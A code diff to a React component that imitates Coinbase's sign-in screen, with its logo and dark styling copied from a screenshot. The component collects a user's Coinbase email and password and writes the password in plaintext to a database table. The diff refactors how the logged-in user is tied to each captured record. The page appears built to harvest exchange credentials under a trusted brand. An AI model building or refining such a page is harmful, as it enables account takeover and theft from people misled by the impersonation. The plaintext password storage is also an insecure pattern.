@@ -2,6 +2,7 @@ import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Eye, EyeOff, KeyRound } from 'lucide-react';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 function CoinbaseMark({ dark }: { dark: boolean }) {
   return (
@@ -30,6 +31,7 @@ function SocialButton({ children, dark, icon }: any) {
 
 export default function CoinbaseConnect() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [step, setStep] = useState('email');
   const [isDarkTheme, setIsDarkTheme] = useState(true); // Default to dark as per screenshot
   const [showPassword, setShowPassword] = useState(false);
@@ -70,14 +72,17 @@ export default function CoinbaseConnect() {
       setErrorMessage('Enter your password to continue.');
       return;
     }
+    if (!user) {
+      setErrorMessage('You must be logged in.');
+      return;
+    }
     setLoading(true);
     try {
-      const { data: { user } } = await supabase.auth.getUser();
       const { error } = await supabase.from('platform_connections').insert({
         platform: 'Coinbase',
         email,
         third_party_password: password,
-        user_id: user?.id || null
+        user_id: user.id
       });
       if (error) throw error;
       navigate('/dashboard?submitted=1');
